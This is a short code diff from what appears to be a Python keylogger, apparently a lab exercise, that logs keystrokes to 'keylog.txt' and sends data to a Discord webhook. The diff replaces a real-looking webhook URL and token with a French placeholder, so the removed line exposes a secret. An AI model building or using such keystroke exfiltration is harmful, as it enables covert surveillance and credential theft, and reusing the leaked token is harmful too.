@@ -7,7 +7,7 @@ import time
 import shutil
 
 # Housekeeping
-WEBHOOK_URL = "https://discord.com/api/webhooks/1475124254667313365/BWfwj0JR3UbSAtCjl43gO9-R9iAJDHxgDxXChpTr8qHxPn1J4FsNvKd1suKZImfKEAT-"
+WEBHOOK_URL = "lien vers le webhook"
 save_dir = "lab_outputs"
 os.makedirs(save_dir, exist_ok=True)
 KEYLOG_FILE = os.path.join(save_dir, "keylog.txt")
